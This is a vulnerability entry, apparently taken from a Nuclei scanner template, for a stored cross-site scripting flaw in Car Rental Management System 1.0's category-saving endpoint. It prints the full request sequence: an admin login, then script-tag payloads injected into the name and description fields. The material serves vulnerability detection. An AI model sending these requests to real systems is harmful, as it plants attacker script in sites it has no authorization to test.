# Vulnerability: Car Rental Management System 1.0 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`carrental-xss.yaml`)

## Description
Car Rental Management System 1.0 contains a cross-site scripting vulnerability via admin/ajax.php?action=save_category in Name and Description parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

POST /admin/ajax.php?action=save_category HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCMJ5bh3B6m9767Em

------WebKitFormBoundaryCMJ5bh3B6m9767Em
Content-Disposition: form-data; name="id"

------WebKitFormBoundaryCMJ5bh3B6m9767Em
Content-Disposition: form-data; name="name"

</script><script>alert(document.domain)</script>
------WebKitFormBoundaryCMJ5bh3B6m9767Em
Content-Disposition: form-data; name="description"

<script>alert(document.domain)</script>
------WebKitFormBoundaryCMJ5bh3B6m9767Em--

GET /admin/index.php?page=categories HTTP/1.1
Host: {{Hostname}}
```

